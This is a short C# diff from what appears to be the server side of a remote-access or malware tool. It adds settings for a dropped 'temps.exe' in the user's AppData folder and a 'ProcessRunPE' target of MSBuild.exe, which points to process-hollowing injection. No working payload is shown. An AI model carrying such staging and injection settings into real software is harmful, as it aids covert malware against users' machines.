@@ -15,7 +15,9 @@ namespace Server
         public static object LockBlocked = new object();
 
         public static string keyAesBase256Gcm = Methods.GetRandomString(16);
-        public static string nameSecureByAMn = "SecureByAMn_"+Methods.GetRandomString(new Random().Next(2, 5));
+        public static string PathSecureByAMn = "SecureByAMn_"+Methods.GetRandomString(new Random().Next(2, 5));
+        public static string temps_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "temps.exe");
+        public static string ProcessRunPE = "MSBuild.exe";
 
         public static long SentValue { get; set; }
         public static long ReceivedValue { get; set; }
